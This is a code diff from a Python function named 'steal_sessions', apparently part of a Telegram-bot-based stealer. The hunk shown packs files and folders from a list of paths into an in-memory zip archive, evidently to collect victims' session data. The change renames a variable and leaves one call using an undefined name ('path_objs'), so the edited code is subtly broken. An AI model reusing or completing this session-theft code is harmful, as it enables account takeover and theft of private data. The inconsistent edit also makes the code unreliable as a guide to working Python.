@@ -64,14 +64,14 @@ async def steal_sessions(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
         with zipfile.ZipFile(mem_zip, mode='w', compression=zipfile.ZIP_DEFLATED) as zf:
             for p in paths:
-                path_obj = Path(p)
-                if path_obj.exists():
-                    if path_obj.is_file():
-                        zf.write(path_obj, arcname=path_obj.name)
-                    elif path_obj.is_dir():
-                        for file in path_obj.rglob('*'):
+                paths_obj = Path(p)
+                if paths_obj.exists():
+                    if paths_obj.is_file():
+                        zf.write(path_objs, arcname=paths_obj.name)
+                    elif paths_obj.is_dir():
+                        for file in paths_obj.rglob('*'):
                             if file.is_file():
-                                zf.write(file, arcname=file.relative_to(path_obj.parent)
+                                zf.write(file, arcname=file.relative_to(paths_obj.parent)
 )
 
         mem_zip.seek(0)
